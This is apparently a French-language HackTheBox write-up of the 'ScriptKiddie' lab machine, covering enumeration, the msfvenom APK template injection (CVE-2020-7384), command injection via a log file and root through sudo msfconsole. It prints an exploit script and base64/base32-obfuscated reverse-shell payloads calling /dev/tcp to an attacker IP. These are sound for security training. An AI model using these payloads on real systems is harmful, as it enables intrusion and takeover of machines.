---
title: HTB | ScriptKiddie
description: ScriptKiddie is an easy difficulty Linux machine that presents a Metasploit vulnerability CVE-2020-7384, along with classic attacks such as OS command injection and an insecure passwordless sudo configuration. Initial foothold on the machine is gained by uploading a malicious .apk file from a web interface that calls a vulnerable version of msfvenom to generate downloadable payloads. Once shell is obtained, lateral movement to a second user is performed by injecting commands into a log file which provides unsanitized input to a Bash script that is triggered on file modification. This user is allowed to run msfconsole as root via sudo without supplying a password, resulting in the escalation of privileges.
slug: scriptkiddie-htb
date: 2025-03-07 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="ScriptKiddie cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">ScriptKiddie</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.226</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/ScriptKiddie]
└─$ nmap -sC -sV -An -T4 -vvv 10.10.10.226
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68=
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo=
|   256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD POST
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
```

## Foothold

### msfvenom - apk template injection
On a accès a une page web sur le port 5000 où plusieurs commandes peuvent etre executés, on a notamment:  

`venom it up - gen rev tcp meterpreter bins` qui nous permet de generer avec msfvenom un reverse meterpreter facilement pour android, linux, windows.

On a le droit de mettre un fichier template. Après une recherche sur internet et sur searchsploit, on observe une vuln dans l'outil msfvenom.

Si on execute msfvenom pour le meterpreter android, en passant un apk vérolé en template(-x), on a une RCE :
> msfvenom -x /tmp/tmp9ep2m3p9/poc.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

```bash
# APK TEMPLATE FILE CREATION PYTHON SCRIPT

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b32encode

# Change me
payload = 'sh -i >& /dev/tcp/10.10.14.19/1337 0>&1'

# b32encode to avoid badchars (keytool is picky)
# thanks to @fdellwing for noticing that base64 can sometimes break keytool
# <https://github.com/justinsteven/advisories/issues/2>
payload_b32 = b32encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b32} | base32 -d | sh #"
...

--------------------------------------

$ python3 poc.py
[+] Manufacturing evil apkfile
Payload: sh -i >& /dev/tcp/10.10.14.19/1337 0>&1
-dname: CN='|echo ONUCALLJEA7CMIBPMRSXML3UMNYC6MJQFYYTALRRGQXDCOJPGEZTGNZAGA7CMMI= | base32 -d | sh #

  adding: empty (stored 0%)
Génération d'une paire de clés RSA de 2 048 bits et d'un certificat auto-signé (SHA256withRSA) d'une validité de 90 jours
	pour : CN="'|echo ONUCALLJEA7CMIBPMRSXML3UMNYC6MJQFYYTALRRGQXDCOJPGEZTGNZAGA7CMMI= | base32 -d | sh #"
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmp9ep2m3p9/poc.apk
Do: msfvenom -x /tmp/tmp9ep2m3p9/poc.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

---------------------------------

┌──(kali㉿kali)-[~/htb/ScriptKiddie]
└─$ nc -lnvp 1337                         
listening on [any] 1337 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.226] 55968
sh: 0: can't access tty; job control turned off
$ whoami
kid
$ cat /home/kid/user.txt
be0d.....478d
```

## kid -> pwn

### /home/pwn/scanlosers.sh
On observe un script qu'on peut lire dans le home directory de l'utilisateur pwn.
On découvre egalement un fichier "hackers" dans dossiers logs/ de kid (notre utilisateur).

Le script de pwn effectue un nmap sur une ip lorsqu'une nouvelle ligne est ajouté dans le fichier de logs hackers. Dans ce cas, il récupère l'ip ecrite en 3ème position sur la ligne, puis fait le nmap. Ensuite, il vide le fichier hackers.

On remarque bien que lorsqu'on ajoute une ligne dans le fichier hackers, il est immédiatement effacé, ce qui prouve que l'utilisateur pwn execute en permanence le script scanlosers.sh.

On peut facilement injecter une commande dans le fichier "hackers" a la place de l'addresse ip. Cette commande sera ensuite executer par pwn lors de l'execution du script scanlosers.
```bash
# Reverse shell en base64
kid@scriptkiddie:/home/pwn$ echo -n 'a a $(echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvNDQ0NCAwPiYx" | base64 -d | bash)' >> /home/kid/logs/hackers

-------------------

┌──(kali㉿kali)-[~/htb/ScriptKiddie]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.226] 56352
sh: 0: can't access tty; job control turned off
$ whoami
pwn
```

## Privilege Escalation

### msfconsole as root
On remarque la possibilité d'executer `msfconsole` en tant que root.
En regardant sur **gtfobins**, on trouve directement un moyen d'ouvrir un shell en tant que root depuis msfconsole
```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
pwn@scriptkiddie:~$ sudo msfconsole
                                                  
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the edit command to open the currently active module in your editor

msf6 > msf6 > irb
[-] Unknown command: msf6.
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system('/bin/sh')
# whoami
root
# cat /root/root.txt        
1f30.....dd22
```